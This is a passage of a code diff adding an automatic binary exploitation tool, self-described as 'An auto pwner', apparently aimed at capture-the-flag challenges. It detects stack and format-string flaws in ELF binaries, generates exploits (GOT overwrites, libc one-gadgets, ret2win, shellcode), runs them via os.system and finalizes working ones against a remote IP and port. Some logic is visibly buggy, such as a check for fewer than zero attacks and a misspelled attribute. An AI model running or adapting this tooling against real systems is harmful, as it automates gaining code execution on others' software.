+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			if (not self.info["pie"]) and (functions_called_after != []) and (infoleaks_libc is not None) and (self.libc_name is not None):
+				attack_type = "FsGotOneshot"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], functions_called_after, infoleaks_libc, self.libc_name, self.libc]
+
+				solway_firth.FsGotOneshot(attack_args)
+
+			if (not self.info["pie"]) and (functions_called_after != []) and (infoleaks_libc is not None) and (self.libc_name is not None):
+				attack_type = "FsGotLibc"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], functions_called_after, infoleaks_libc, self.libc_name, self.libc]
+
+				solway_firth.FsGotLibc(attack_args)
+
+			if (not self.info["pie"]) and (functions_called_after != []) and (is_system_imported):
+				attack_type = "FsGotSystem"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], functions_called_after]
+
+				exploit = solway_firth.FsGotSystem(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			if (self.info["pie"]) and (functions_called_after != []) and (is_system_imported) and (infoleaks_pie is not None):
+				attack_type = "FsGotSystemPie"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], functions_called_after, infoleaks_pie]
+
+				exploit = solway_firth.FsGotSystemPie(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+
+			if (has_win_func) and (not self.info["pie"]) and (infoleaks_stack is not None):
+				attack_type = "FsRetWinFunc"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], self.win_funcs, infoleaks_stack]
+
+				exploit = solway_firth.FsRetWinFunc(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			if (has_possible_win_func) and (not self.info["pie"]) and (infoleaks_stack is not None):
+				attack_type = "FsRetWinFunc"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], self.possible_win_funcs, infoleaks_stack]
+
+				exploit = solway_firth.FsRetWinFunc(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			if (can_execute_shellcode) and (infoleaks_stack is not None):
+				attack_type = "FsRetShellcode"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], infoleaks_stack, self.info["pie"]]
+
+				exploit = solway_firth.FsRetShellcode(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+
+			if (can_execute_shellcode) and (infoleaks_stack is not None) and (functions_called_after != []) and (not self.info["pie"]):
+				attack_type = "FsGotShellcode"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], functions_called_after, infoleaks_stack]
+
+				exploit = solway_firth.FsGotShellcode(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			if (not self.info["pie"]) and (not self.info["nx"]) and (functions_called_after != []):
+				attack_type = "FsGotShellcodeFsleak"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], functions_called_after]
+
+				exploit = solway_firth.FsGotShellcodeFsleak(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+
+			if (self.info["pie"]) and (has_possible_win_func) and (functions_called_after != []):
+				attack_type = "FsGotWinFuncPieFsleak"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], self.possible_win_funcs, functions_called_after]
+
+				exploit = solway_firth.FsGotWinFuncPieFsleak(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+
+			if (self.info["pie"]) and (has_win_func) and (functions_called_after != []):
+				attack_type = "FsGotWinFuncPieFsleak"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], self.win_funcs, functions_called_after]
+
+				exploit = solway_firth.FsGotWinFuncPieFsleak(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+
+			if (not self.info["pie"]) and (self.libc_name is not None):
+				attack_type = "FsGotLibcFsleakLoop"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], self.libc_name, self.libc]
+
+				solway_firth.FsGotLibcFsleakLoop(attack_args)
+
+		for i in range(0, num_callinput_vulns):
+			attack_type = "CallInput"
+			attack_args = [self.elf_name, self.elf, self.callinput_vulns[i]]
+
+			exploit = solway_firth.CallInput(attack_args)
+
+			self.verify_exploit(exploit)
+			attacks.append([attack_type, attack_args])
+
+
+		# Exploit Correction
+		if len(attacks) < 0:
+			self.failed_attack()
+
+		num_attacks = len(attacks)
+		for i in range(0, num_attacks):
+			attack_type = attacks[i][0]
+			attack_args = attacks[i][1]
+			exploits = CORRECTION_FUNCS[attack_type](attack_args)
+			working_exploit = self.verify_exploit(exploits)
+			if working_exploit != False:
+				self.solidify_exploit(working_exploit)
+
+		self.failed_attack()
+
+	def verify_exploit(self, exploits):
+		if os.path.exists(solway_firth.WIN_FILE):
+			os.remove(solway_firth.WIN_FILE)
+		if os.path.exists(solway_firth.LOOSE_FILE):
+			os.remove(solway_firth.LOOSE_FILE)
+
+		for exploit in exploits:
+			if os.path.exists(exploit):
+				os.system("python3 %s" % exploit)
+				if os.path.exists(solway_firth.WIN_FILE):
+					os.remove(solway_firth.WIN_FILE)
+					self.solidify_exploit(exploit)
+				elif os.path.exists(solway_firth.LOOSE_FILE):
+					os.remove(solway_firth.LOOSE_FILE)
+			else:
+				print("Exploit writing errors")
+		else:
+			return False
+
+	def run_dynamic_analysis(self):
+		current_directory = os.getcwd() + "/"
+		cmd = "python3 " + INSTALL_DIR + DYN_ANALYZER_NAME + " -b " + self.elf_name + " -o " + current_directory + VULN_OUTPUT_FILE
+
+		os.system(cmd)
+
+		try:
+			vulns_file = open(current_directory + VULN_OUTPUT_FILE, "rb")
+		except:
+			return
+
+		more_vulns = True
+
+		while more_vulns:
+			try:
+				self.vulns.append(pickle.load(vulns_file))
+			except:
+				more_vulns = False
+
+		self.ran_dynamic_analysis = True
+
+	def try_ultimate_jutsus(self):
+		if self.info["link"]:
+			plt_funcs =	self.grab_plt_funcs()
+
+			for i in range(0, len(self.stack_vulns)):
+				if ((self.ip_port is not None) and ("puts" in plt_funcs.keys())):
+					attack_type = "IdLibcPutsInfoleak"
+					attack_args = [self.elf_name, self.stack_vulns[i], plt_funcs, self.ip_port]
+					solway_firth.IdLibcPutsInfoleak(attack_args)
+
+		if self.ip_port is None:
+			print("\n\n\nPlease provide remote port and ip.\n\n\n")
+
+	def grab_plt_funcs(self):
+		plt_funcs = get_plt_functions(True)
+		return plt_funcs
+
+	def solidify_exploit(self, exploit):
+		print("\n\nExploit Successful: %s\n\n" % exploit)
+		solway_firth.finalize_exploit(exploit, self.ip_port, self.normie)
+		sys.exit(0)
+
+	def get_functions_called_after(self, address):
+		called_functions = []
+
+		found = False
+
+		dissassembly = str(subprocess.check_output(["objdump", "-D", self.elf_name])).split("\\n")
+		for dis_line in dissassembly:
+
+			if (hex(address)[2:] in dis_line) and (not found):
+				found = True
+				continue
+
+			if not found:
+				continue
+
+			if "call" in dis_line:
+				if "@plt>" in dis_line:
+					function = dis_line.split("@plt>")[0].split("<")[-1]
+					if "stack" not in function:
+						called_functions.append(function)
+
+			if "\\tret" in dis_line:
+				return called_functions
+		return called_functions
+
+	def failed_attack(self):
+		if not self.reran_analysis:
+			self.reran_analysis = True
+			if not self.ran_dynamic_analsis:
+				self.run_dynamic_analysis()
+
+			self.get_binary_vulns()
+			self.quantify_vulns()
+			self.plan_attack()
+		else:
+			self.try_ultimate_jutsus()
+			print("\n\nCould not pwn binary\n\n")
+			sys.exit(0)
+
+	def grab_plt_funcs(self):
+		plt_funcs = self.get_plt_functions(True)
+		return plt_funcs
+
+if __name__ == "__main__":
+
+	# Parse Out the arguments
+	parser = argparse.ArgumentParser(description = "An auto pwner")
+	parser.add_argument("-b", metavar="binary", type=str, help="The binary you are working with.", default=None)
+	parser.add_argument("-l", metavar="libc", type=str, help="The libc that the binary is linked with.", default=None)
+	parser.add_argument("-i", metavar="ip", type=str, help="The IP the remote challenge is listening on.", default=None)
+	parser.add_argument("-p", metavar="port", type=str, help="The port the remote challenge is listening on.", default=None)
+	parser.add_argument("-a", metavar="additional_files", type=str, nargs='+', help="Specify additional files needed to run the binary.", default=None, action='append')
+	parser.add_argument("-r", type=bool, nargs='?', help="Reset imported Ghidra binaries.", const=True, default=False)
+	parser.add_argument("-d", metavar="cmd", type=str, help="Test certain functionallity.", default=None)
+	parser.add_argument("--normie", type=bool, nargs='?', help="Be a normie.", const=False, default=True)
+
+	args = parser.parse_args()
+
+	normie = args.normie
+
+	# Make the remenissions class
+	auto_pwner = Remenissions()
+
+	normie = args.normie
+	auto_pwner.normie = normie
+
+	# Check if we need to reset the ghidra project
+	reset = args.r
+	if reset:
+		auto_pwner.reset_imported_binaries()
+
+
+	# Assign the values
+
+	# Binary / Libc
+	auto_pwner.elf_name = args.b
+	if auto_pwner.elf_name is None:
+		print("Specify binary with -b")
+		sys.exit(0)
+		
+	auto_pwner.libc_name = args.l
+
+	# Remote IP / port
+	remote_ip = args.i
+	remote_port = args.p
+
+	if (remote_ip is not None) and (remote_port is not None):
+		auto_pwner.ip_port = [remote_ip, remote_port]
+
+	auto_pwner.debug_cmd = args.d
+
+	if args.a is not None:
+		if len(args.a) >= 1:
+			args.a = args.a[0]
+
+	auto_pwner.additional_files = args.a
+
+	auto_pwner.switch_directory()
+
+	print("\n\nAnalyzing Binary: %s\n\n" % (auto_pwner.elf_name))
+
+	auto_pwner.get_binary_attributes()
+
+	auto_pwner.check_parameters()
+	
+	# Check if we are running a debug cmd
+	debug_cmd = args.d
+	if debug_cmd is not None:
+		auto_pwner.run_debug_cmd(debug_cmd)
+
+	auto_pwner.get_binary_vulns()
+
+	auto_pwner.quantify_vulns()
+
+	auto_pwner.plan_attack()
